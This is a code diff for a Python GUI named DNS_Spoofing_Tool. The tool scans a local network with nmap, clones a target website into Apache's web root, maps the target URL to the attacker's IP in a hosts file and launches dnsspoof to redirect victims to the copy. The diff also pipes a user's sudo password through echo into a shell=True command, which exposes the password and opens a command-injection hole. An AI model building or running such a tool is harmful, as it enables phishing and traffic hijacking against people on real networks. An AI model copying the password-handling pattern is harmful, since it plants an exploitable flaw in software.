@@ -1,15 +1,11 @@
-#!/usr/bin/env python3
-
 import os
 import subprocess
 import tkinter as tk
-from tkinter import filedialog, messagebox, simpledialog
+from tkinter import filedialog, messagebox, simpledialog, ttk
 import netifaces
 import nmap
-import requests
-from bs4 import BeautifulSoup
-import shutil
-import re
+import threading
+import getpass
 
 class Tooltip:
     def __init__(self, widget, text):
@@ -31,6 +27,30 @@ class Tooltip:
     def leave(self, event=None):
         if self.tooltip:
             self.tooltip.destroy()
+
+class NmapScanWindow:
+    def __init__(self, parent, ip_range):
+        self.parent = parent
+        self.ip_range = ip_range
+        self.root = tk.Toplevel(parent)
+        self.root.title("Nmap Scan Progress")
+
+        self.progress_label = tk.Label(self.root, text="Scanning in progress...")
+        self.progress_label.pack(padx=10, pady=5)
+
+        self.progress_bar = ttk.Progressbar(self.root, orient="horizontal", length=200, mode="indeterminate")
+        self.progress_bar.pack(padx=10, pady=5)
+        self.progress_bar.start()
+
+        self.scan_result_text = tk.Text(self.root, height=15, width=50)
+        self.scan_result_text.pack(padx=10, pady=5)
+
+    def update_scan_results(self, results):
+        self.scan_result_text.insert(tk.END, results)
+        self.scan_result_text.see(tk.END)
+
+    def close_window(self):
+        self.root.destroy()
 
 class DNS_Spoofing_Tool:
     def __init__(self, root):
@@ -92,17 +112,19 @@ class DNS_Spoofing_Tool:
             # Retrieve IP range from user input
             ip_range_input = simpledialog.askstring("IP Range", "Enter IP range (e.g., 192.168.0.0/24):")
             if ip_range_input:
+                self.scan_window = NmapScanWindow(self.root, ip_range_input)
                 # Perform a network scan to identify other devices on the network
                 nm = nmap.PortScanner()
 
                 # Callback function to update UI with scan results
                 def callback_result(host, scan_result):
                     manufacturer = scan_result['vendor'].get('mac') if 'vendor' in scan_result else "Unknown"
-                    self.target_ips_text.insert(tk.END, f"IP: {host}, Manufacturer: {manufacturer}\n")
-                    self.root.update()  # Update the UI
+                    result = f"IP: {host}, Manufacturer: {manufacturer}\n"
+                    self.scan_window.update_scan_results(result)
 
                 # Scan hosts in the given IP range
                 nm.scan(hosts=ip_range_input, arguments='-sn', callback=callback_result)
+                threading.Thread(target=self.scan_window.root.mainloop).start()
 
         except Exception as e:
             messagebox.showerror("Error", f"An error occurred while scanning IPs: {str(e)}")
@@ -117,28 +139,35 @@ class DNS_Spoofing_Tool:
             os.makedirs(folder_path)
 
         # Save HTML file
-        with open(os.path.join(folder_path, 'index.html'), 'w') as file:
+        html_file_path = os.path.join(folder_path, 'index.html')
+        with open(html_file_path, 'w') as file:
             file.write(soup.prettify())
 
         # Download and save CSS files
+        css_file_paths = []
         for link in soup.find_all('link', href=True):
             css_url = link['href']
             if css_url.startswith(('http://', 'https://')):
                 css_response = requests.get(css_url)
                 css_file_name = re.sub(r'\W+', '', os.path.basename(css_url))  # Remove non-alphanumeric characters
-                with open(os.path.join(folder_path, css_file_name), 'wb') as css_file:
+                css_file_path = os.path.join(folder_path, css_file_name)
+                with open(css_file_path, 'wb') as css_file:
                     css_file.write(css_response.content)
+                css_file_paths.append(css_file_path)
 
         # Download and save JavaScript files
+        js_file_paths = []
         for script in soup.find_all('script', src=True):
             js_url = script['src']
             if js_url.startswith(('http://', 'https://')):
                 js_response = requests.get(js_url)
                 js_file_name = re.sub(r'\W+', '', os.path.basename(js_url))  # Remove non-alphanumeric characters
-                with open(os.path.join(folder_path, js_file_name), 'wb') as js_file:
+                js_file_path = os.path.join(folder_path, js_file_name)
+                with open(js_file_path, 'wb') as js_file:
                     js_file.write(js_response.content)
+                js_file_paths.append(js_file_path)
 
-        messagebox.showinfo("Success", f"Website downloaded successfully to {folder_path}")
+        return html_file_path, css_file_paths, js_file_paths
 
     def select_folder(self):
         # Opens file dialog to select folder for downloaded website files
@@ -153,7 +182,7 @@ class DNS_Spoofing_Tool:
 
             # Download website contents
             if self.downloaded_folder:
-                self.download_website(target_url, self.downloaded_folder)
+                html_file_path, css_file_paths, js_file_paths = self.download_website(target_url, self.downloaded_folder)
 
                 # Update hosts.txt with Parrot Linux IP and target URL
                 hosts_file_path = "/tmp/hosts.txt"
@@ -161,11 +190,22 @@ class DNS_Spoofing_Tool:
                     f.write(f"{parrot_ip} {target_url}")
 
                 # Move downloaded website files to Apache's root directory
-                shutil.move(self.downloaded_folder, "/var/www/html/")
+                shutil.move(html_file_path, "/var/www/html/")
+                for css_file_path in css_file_paths:
+                    shutil.move(css_file_path, "/var/www/html/")
+                for js_file_path in js_file_paths:
+                    shutil.move(js_file_path, "/var/www/html/")
 
-                # Start DNS spoofing with selected network interface
-                subprocess.Popen(["sudo", "dnsspoof", "-i", selected_interface, "-f", hosts_file_path])
-                messagebox.showinfo("Success", "DNS Spoofing started successfully!")
+                # Get sudo password
+                sudo_password = simpledialog.askstring("Password", "Enter your sudo password:", show="*")
+                if sudo_password:
+                    # Start DNS spoofing with selected network interface
+                    command = f"echo {sudo_password} | sudo -S dnsspoof -i {selected_interface} -f {hosts_file_path}"
+                    subprocess.Popen(command, shell=True)
+                    messagebox.showinfo("Success", "DNS Spoofing started successfully!")
+                else:
+                    messagebox.showerror("Error", "Password not provided.")
+
             else:
                 messagebox.showerror("Error", "Please select a folder for downloaded website files.")
         except Exception as e:
